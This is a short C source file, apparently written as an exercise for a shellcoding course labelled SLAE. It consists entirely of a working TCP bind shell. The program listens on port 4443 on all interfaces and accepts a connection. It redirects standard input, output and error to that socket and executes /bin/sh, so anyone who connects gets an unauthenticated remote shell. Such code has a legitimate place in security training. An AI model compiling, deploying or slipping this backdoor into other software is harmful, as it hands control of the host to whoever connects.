// Author: Jake Homberg
// Website: somewhatsec.wordpress.com
// SLAE - 1049

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
	int dupctr;
	int sockfd, clientfd;
	int port = 4443;
	struct sockaddr_in saddr;
	
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	saddr.sin_family = AF_INET;
	saddr.sin_port   = htons(port);
	saddr.sin_addr.s_addr = INADDR_ANY;
	
	bind(sockfd, (struct sockaddr*) &saddr, sizeof(saddr));
	
	listen(sockfd, 0);
	
	clientfd = accept(sockfd, NULL, NULL);

	for(dupctr = 0; dupctr<=2; dupctr++)
		dup2(clientfd, dupctr);
	
	execve("/bin/sh", NULL, NULL);
}

